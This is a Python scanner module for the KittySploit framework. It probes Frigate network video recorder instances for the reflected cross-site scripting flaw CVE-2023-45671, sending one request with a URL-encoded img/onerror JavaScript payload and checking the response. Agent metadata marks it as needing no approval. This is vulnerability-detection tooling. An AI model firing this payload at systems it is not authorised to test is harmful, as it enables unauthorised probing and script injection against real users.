#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Frigate is an open source network video recorder."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Frigate < 0.13.0 Beta 3 - Cross-Site Scripting Detection',
        'description': "Frigate is an open source network video recorder. Before version 0.13.0 Beta 3, there is a reflected cross-site scripting vulnerability in any API endpoints reliant on the `/<camera_name>` base path as values provided for the path are not sanitized. Exploiting this vulnerability requires the attacker to both know very specific information about a user's Frigate server and requires an authenticated user to be tricked into clicking a specially crafted link to their Frigate instance. This vulnerability could exploited by an attacker under the following circumstances: Frigate publicly exposed to the internet (even with authentication); attacker knows the address of a user's Frigate instance; attacker crafts a specialized page which links to the user's Frigate instance; attacker finds a way to get an authenticated user to visit their specialized page and click the button/link. As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads. Version 0.13.0 Beta 3 contains a patch for this issue.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'frigate', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-45671',
            'https://securitylab.github.com/advisories/GHSL-2023-190_Frigate/',
        ],
        'cve': 'CVE-2023-45671',
    }

    def run(self):
        path = '/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html',)
        if any(m in headers for m in header_any):
            self.set_info(
                severity='medium',
                reason='Frigate < 0.13.0 Beta 3 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

